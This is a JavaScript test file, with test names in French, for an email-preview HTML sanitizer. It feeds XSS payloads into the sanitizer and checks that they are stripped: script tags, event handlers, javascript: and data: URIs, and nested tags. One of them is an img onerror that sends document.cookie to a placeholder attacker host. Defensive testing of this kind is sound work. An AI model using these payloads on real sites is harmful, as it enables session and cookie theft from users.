import test from 'node:test';
import assert from 'node:assert/strict';
import {
  buildSandboxedEmailPreviewDocument,
  escapeHtmlText,
  sanitizeEmailPreviewHtml,
} from '../utils/htmlSanitizer';

test('htmlSanitizer — neutralisation XSS et échappement des aperçus e-mail', async (t) => {
  await t.test('1. Supprime les balises script, iframe, svg et gestionnaires on*', () => {
    const payload = [
      '<div>Bonjour <strong>Koffi</strong></div>',
      '<script>alert("xss1")</script>',
      '<img src="x" onerror="fetch(\'https://evil.example/?c=\'+document.cookie)" />',
      '<svg onload="alert(2)"><circle r="10"/></svg>',
      '<iframe src="https://evil.example"></iframe>',
      '<a href="javascript:alert(3)" onclick=alert(4)>Cliquez ici</a>',
      '<a href="data:text/html,<script>alert(5)</script>">Lien data</a>',
    ].join('');

    const sanitized = sanitizeEmailPreviewHtml(payload);

    assert.equal(sanitized.includes('<script'), false);
    assert.equal(sanitized.includes('<iframe'), false);
    assert.equal(sanitized.includes('<svg'), false);
    assert.equal(sanitized.includes('onerror'), false);
    assert.equal(sanitized.includes('onload'), false);
    assert.equal(sanitized.includes('onclick'), false);
    assert.equal(sanitized.includes('javascript:'), false);
    assert.equal(sanitized.includes('data:text/html'), false);
    assert.equal(sanitized.includes('<strong>Koffi</strong>'), true);
  });

  await t.test('2. Neutralise les balises imbriquées reconstruites et expressions CSS', () => {
    const nested = '<scr<script>ipt>alert(1)</scr</script>ipt><div style="width: expression(alert(1)); background: url(javascript:alert(2))">Test</div>';
    const sanitized = sanitizeEmailPreviewHtml(nested);

    assert.equal(/<\s*script/i.test(sanitized), false);
    assert.equal(/expression\s*\(/i.test(sanitized), false);
    assert.equal(/url\(\s*javascript:/i.test(sanitized), false);
  });

  await t.test('3. buildSandboxedEmailPreviewDocument embarque une politique CSP stricte', () => {
    const doc = buildSandboxedEmailPreviewDocument('<p>Livraison #LL-101</p><script>evil()</script>');
    assert.equal(doc.includes('Content-Security-Policy'), true);
    assert.equal(doc.includes("default-src 'none'"), true);
    assert.equal(doc.includes('<script'), false);
    assert.equal(doc.includes('<p>Livraison #LL-101</p>'), true);
  });

  await t.test('4. escapeHtmlText échappe strictement les caractères spéciaux', () => {
    const escaped = escapeHtmlText('<img src=x onerror="alert(\'xss\')">&');
    assert.equal(escaped.includes('<'), false);
    assert.equal(escaped.includes('>'), false);
    assert.equal(escaped, '&lt;img src=x onerror=&quot;alert(&#39;xss&#39;)&quot;&gt;&amp;');
  });
});
